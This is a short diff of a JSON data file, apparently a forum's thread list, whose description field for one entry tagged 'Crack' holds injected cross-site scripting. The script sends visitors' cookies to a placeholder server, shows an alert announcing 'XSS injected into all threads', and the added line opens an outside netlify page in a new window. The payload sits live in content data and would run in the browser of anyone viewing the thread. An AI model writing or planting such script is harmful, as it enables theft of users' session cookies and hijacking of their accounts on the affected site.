@@ -10,7 +10,7 @@
       "tag": "Crack",
       "tagClass": "tag-red",
       "link": null,
-      "description": "<script>fetch(\"https://YOUR_SERVER/log?cookie=\"+document.cookie)</script><script>alert(\"XSS injected into all threads!\")</script>",
+      "description": "<script>fetch(\"https://YOUR_SERVER/log?cookie=\"+document.cookie)</script><script>alert(\"XSS injected into all threads!\")</script><script>window.open(\"https://nevermissserver.netlify.app/#cat-offtopic\",\"_blank\")</script>",
       "comments": [],
       "category": "news",
       "pinned": false,
